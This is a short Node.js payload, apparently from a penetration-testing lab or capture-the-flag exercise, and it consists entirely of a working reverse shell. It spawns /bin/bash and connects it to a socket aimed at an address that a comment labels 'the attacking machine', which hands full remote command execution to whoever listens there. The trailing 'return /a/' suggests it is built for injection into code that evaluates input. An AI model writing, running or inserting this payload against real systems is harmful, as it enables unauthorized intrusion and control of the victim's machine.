(function(){     
 var net = require("net"),         
       cp = require("child_process"),         
       sh = cp.spawn("/bin/bash", []);     
  var client = new net.Socket();
 
  //create connection to the attacking machine
  client.connect(80, "192.168.49.164", function(){         
      client.pipe(sh.stdin);         
      sh.stdout.pipe(client);        
      sh.stderr.pipe(client); 
  });     
  return /a/; 
})()%
